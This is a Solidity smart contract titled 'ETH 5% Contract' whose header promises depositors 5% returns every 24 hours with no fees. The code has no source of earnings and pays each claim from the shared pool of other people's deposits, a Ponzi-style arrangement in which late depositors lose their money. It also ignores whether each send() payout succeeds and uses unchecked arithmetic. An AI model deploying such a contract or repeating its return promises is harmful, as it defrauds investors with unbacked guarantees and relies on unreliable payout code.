1 pragma solidity ^0.4.24;
2 
3 /**
4  *
5  * ETH 5% Contract
6  *  - GAIN 5% PER 24 HOURS (every 5900 blocks)
7  *  - No fees on your investment 
8  *
9  * How to use:
10  *  1. Send any amount of ether to make an investment
11  *  2a) Claim your profit by sending 0 ether transaction
12  *  OR
13  *  2b) Send more ether to reinvest AND get your profit at the same time
14  *
15  * RECOMMENDED GAS LIMIT: 70000
16  * RECOMMENDED GAS PRICE: https://ethgasstation.info/
17  *
18  */
19 contract FreeInvestment5 {
20     // records amounts invested
21     mapping (address => uint256) invested;
22     // records blocks at which investments were made
23     mapping (address => uint256) atBlock;
24 
25     // this function called every time anyone sends a transaction to this contract
26     function () external payable {
27         // if sender is invested more than 0 ether
28         if (invested[msg.sender] != 0) {
29             // calculate profit amount as such:
30             // amount = (amount invested) * 5% * (blocks since last transaction) / 5900
31             // 5900 is an average block count per day produced by Ethereum blockchain
32             uint256 amount = invested[msg.sender] * 5/100 * (block.number - atBlock[msg.sender]) / 5900;
33 
34 
35             // send calculated amount of ether directly to sender
36             address sender = msg.sender;
37             sender.send(amount);
38         }
39 
40         // record block number and invested amount (msg.value) of this transaction
41         atBlock[msg.sender] = block.number;
42         invested[msg.sender] += msg.value;
43     }
44 }